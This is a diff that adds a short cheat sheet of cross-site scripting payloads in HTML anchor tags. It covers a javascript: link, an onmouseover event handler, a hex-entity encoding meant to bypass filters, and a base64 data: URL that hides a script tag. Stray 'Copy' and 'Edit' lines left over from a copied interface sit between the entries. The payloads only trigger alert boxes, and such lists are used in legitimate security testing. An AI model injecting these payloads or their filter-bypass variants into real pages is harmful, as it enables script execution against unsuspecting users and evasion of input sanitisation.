@@ -1,0 +1,20 @@
+Basic XSS in <a> tag
+html
+Copy
+Edit
+<a href="javascript:alert(1)">Click Me</a>
+Using onmouseover for Event-based XSS
+html
+Copy
+Edit
+<a href="#" onmouseover="alert('XSS')">Hover Me</a>
+Bypassing Filters with Hex Encoding
+html
+Copy
+Edit
+<a href="jav&#x61;script:alert(1)">Bypass</a>
+Data URL Execution
+html
+Copy
+Edit
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Here</a>
